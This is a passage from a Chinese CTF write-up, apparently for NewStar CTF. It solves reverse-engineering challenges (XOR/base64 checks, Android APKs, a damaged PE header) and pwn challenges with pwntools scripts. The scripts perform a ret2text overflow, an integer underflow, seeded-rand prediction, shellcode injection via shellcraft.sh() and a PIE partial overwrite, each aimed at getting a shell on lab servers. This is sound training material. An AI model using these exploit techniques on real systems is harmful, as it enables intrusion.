class="built_in">strlen</span>(a1);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">2</span> * v1 + <span class="number">1</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">    v4[v2] = (a1[i] ^ <span class="number">0x20</span>) + <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc=<span class="string">&#x27;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">enc = base64.b64decode(enc).<span class="built_in">hex</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)//<span class="number">2</span>):</span><br><span class="line">    flag+= <span class="built_in">chr</span>((<span class="built_in">int</span>(enc[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>)-<span class="number">16</span>)^<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>解出flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927143345417.png" alt="image-20230927143345417"></p><h3 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h3><p>checksec一下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927153451241.png" alt="image-20230927153451241"></p><p>64位小端</p><p>反编译后源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  v5 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != (<span class="built_in">array</span>[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>array数组为<code>[0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]</code></p><p>逻辑非常简单，flag的ASCII码正好可以通过5轮异或得到，直接编写exp脚本</p><p>需要注意的是，由于采取的是小端存储，所以array中的每个元素需要倒着处理后加到flag上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">array=[<span class="number">0x75553A1E</span>, <span class="number">0x7B583A03</span>, <span class="number">0x4D58220C</span>, <span class="number">0x7B50383D</span>, <span class="number">0x736B3819</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> array:</span><br><span class="line">    h = <span class="built_in">str</span>(<span class="built_in">hex</span>(h^<span class="number">0x12345678</span>))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(h[<span class="number">10</span>-j*<span class="number">2</span>:<span class="number">12</span>-j*<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927153257531.png" alt="image-20230927153257531"></p><p>补个右括号</p><h3 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h3><p>丢进jadx反编译，在AndroidManifest找到主入口</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927154752737.png" alt="image-20230927154752737"></p><p>源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;androxor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Xor</span><span class="params">(String str, String str2)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] cArr = &#123;<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;;</span><br><span class="line">        <span class="type">char</span>[] cArr2 = <span class="keyword">new</span> <span class="title class_">char</span>[str.length()];</span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> str.length() != <span class="number">25</span> ? <span class="string">&quot;wrong!!!&quot;</span> : <span class="string">&quot;you win!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">charAt</span> <span class="operator">=</span> (<span class="type">char</span>) (str.charAt(i) ^ str2.charAt(i % str2.length()));</span><br><span class="line">            cArr2[i] = charAt;</span><br><span class="line">            <span class="keyword">if</span> (cArr[i] != charAt) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;wrong!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="type">ActivityMainBinding</span> <span class="variable">inflate</span> <span class="operator">=</span> ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        <span class="built_in">this</span>.binding = inflate;</span><br><span class="line">        setContentView(inflate.getRoot());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(R.id.password);</span><br><span class="line">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.chick.androxor.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> editText.getText().toString();</span><br><span class="line">                <span class="type">MainActivity</span> <span class="variable">mainActivity</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;</span><br><span class="line">                Toast.makeText(mainActivity, mainActivity.Xor(obj, <span class="string">&quot;happyx3&quot;</span>), <span class="number">1</span>).show();</span><br><span class="line">                Log.d(<span class="string">&quot;输入&quot;</span>, editText.getText().toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给Xor()传入的参数中str为用户输入，str2为<code>happyx3</code></p><p>编写exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cArr = [<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>]</span><br><span class="line">str2=<span class="string">&#x27;happyx3&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isint</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isinstance</span>(x,<span class="built_in">int</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    a = cArr[i]</span><br><span class="line">    b = str2[i%<span class="number">7</span>]</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> isint(a)):</span><br><span class="line">        a = <span class="built_in">ord</span>(a)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> isint(b)):</span><br><span class="line">        b = <span class="built_in">ord</span>(b)</span><br><span class="line">    flag += <span class="built_in">chr</span>(a^b)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927162225707.png" alt="image-20230927162225707"></p><h3 id="lazy-activity"><a href="#lazy-activity" class="headerlink" title="lazy_activity"></a>lazy_activity</h3><p>查看AndroidManifest.xml 文件</p><p>发现app除了主入口还有一个FlagActivity，且<code>android:exported</code>属性设置为false，说明不允许让外部组件启动这个Activity</p><p>查看源码，发现该节目的资源文件为R.layout.layout_2</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927192340469.png" alt="image-20230927192340469"></p><p>查看资源文件，发现flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927192428416.png" alt="image-20230927192428416"></p><h3 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h3><p>该PE文件无法执行，猜测是文件头被篡改</p><p>PE文件开头一般会有ASCII码<code>MZ</code></p><p>用010查看发现被改成了<code>WZ</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927193619682.png" alt="image-20230927193619682"></p><p>同时PE头指向错误</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927200051110.png" alt="image-20230927200051110"></p><p>修改成功后该可执行文件可以打开</p><p>还是老规矩丢进IDA</p><p>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;draw);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your flag!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(input) - <span class="number">1</span>; ++i )</span><br><span class="line">    input[i] ^= i ^ input[i + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input, data) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You Win!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You lose!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处比较处理后的<code>flag</code>和<code>data</code>是否相等</p><p>查看data发现数组大小有问题，调整为64</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927203650452.png" alt="image-20230927203650452"></p><p><code>data=[0x0A, 0x0C, 4, 0x1F,0x26, 0x6C, 0x43, 0x2D, 0x3C, 0x0C, 0x54, 0x4C, 0x24, 0x25, 0x11, 6, 5, 0x3A, 0x7C, 0x51, 0x38, 0x1A, 3, 0x0D, 1, 0x36, 0x1F, 0x12, 0x26, 4, 0x68, 0x5D, 0x3F, 0x2D, 0x37, 0x2A, 0x7D, 0x1B]</code></p><p>编写exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">4</span>, <span class="number">0x1F</span>,<span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>, <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">3</span>, <span class="number">0x0D</span>, <span class="number">1</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">4</span>, <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span>, <span class="number">0x1B</span>]</span><br><span class="line">flag=<span class="string">&#x27;f&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">2</span>):</span><br><span class="line">    flag+= <span class="built_in">chr</span>(i^data[i]^<span class="built_in">ord</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927205011882.png" alt="image-20230927205011882"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>首先checksec一下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927002554341.png" alt="image-20230927002554341"></p><p>开启了堆栈不可执行保护</p><p>丢到IDA看到<strong>backdoor</strong>函数</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926223355053.png" alt="image-20230926223355053"></p><p>命令执行函数地址为<code>0x004011FB</code></p><p>buf距离rbp的距离为<code>0x20</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926225334300.png" alt="image-20230926225334300"></p><p>或者用gdb找到溢出点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">pattern_create 400 in.txt</span></span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">r  &lt; in.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927085314145.png" alt="image-20230927085314145"></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29234</span>)</span><br><span class="line">success_addr = <span class="number">0x4011FB</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span>  + p64(success_addr)</span><br><span class="line">conn.recvuntil(<span class="string">b&quot;magic\n&quot;</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>成功getshell</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927093615333.png" alt="image-20230927093615333"></p><h3 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar_shop"></a>newstar_shop</h3><p>丢到IDA反编译</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926132549618.png" alt="image-20230926132549618"></p><p>首先查看<strong>shop()</strong>函数</p><p>获得hint：<code>What will happen when int transfer to unsigned int?</code></p><p>猜测这题考点就是C语言中<strong>正整数溢出</strong>机制，即让钱数变为负数则会溢出</p><p>同时得知钱足够即可获得shell</p><p>查看<strong>dont_try()</strong>函数</p><p>发现选择该选项会扣钱</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926133618625.png" alt="image-20230926133618625"></p><p>找到变量<strong>money</strong>的初始值为100</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926134901312.png" alt="image-20230926134901312"></p><p>所有我们可以先<strong>买两个商品2和一个商品1</strong></p><p>然后<strong>选3把钱扣成负数</strong></p><p>连上nc测试一下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926135301777.png" alt="image-20230926135301777"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926135320088.png" alt="image-20230926135320088"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926135330786.png" alt="image-20230926135330786"></p><h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h3><p>阅读反编译后的源码</p><p>本题使用time()返回的值作为随机数种子</p><p>使用python的<strong>ctypes库在本地模拟</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927110110215.png" alt="image-20230927110110215"></p><p>这里只给两个字符，大概率执行命令<code>sh</code></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26460</span>)</span><br><span class="line">libc =cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">srand = libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;can you guess the number?&#x27;</span>)</span><br><span class="line">conn.sendline(libc.rand().encode())</span><br><span class="line">conn.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927112725422.png" alt="image-20230927112725422"></p><h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p>查看arch</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927214910208.png" alt="image-20230927214910208"></p><p>反编译源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  buf = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to NewStar CTF!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Show me your magic&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  JUMPOUT(<span class="number">0x66660000</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shellcode地址为<code>0x66660000</code></p><p>buf被映射到shellcode处</p><p>那就不用垫了，直接把shellcode写进buf</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27801</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">conn.recvuntil(<span class="string">b&quot;magic\n&quot;</span>)</span><br><span class="line">conn.sendline(shellcode)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>成功getshell</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927222426938.png" alt="image-20230927222426938"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927222712912.png" alt="image-20230927222712912"></p><h3 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h3><p>checksec一下，发现开了pie</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927224509401.png" alt="image-20230927224509401"></p><p>查看IDA反编译源码</p><p><code>sub_1264()</code>函数为后门</p><p>可以利用<code>sub_120E()</code>覆盖返回地址到后门</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230928111714741.png" alt="image-20230928111714741"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230928111738385.png" alt="image-20230928111738385"></p><p>由于开了PIE保护，修改后两位的相对地址即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230928111904249.png" alt="image-20230928111904249"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230928134120852.png" alt="image-20230928134120852"></p><p>编写exp， 后门需要+5跳过push rbp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26204</span>)</span><br><span class="line">success_addr = <span class="number">0x69</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span>  + p64(success_addr)</span><br><span class="line">conn.recvuntil(<span class="string">b&quot;pie!!!\n&quot;</span>)</span><br><span 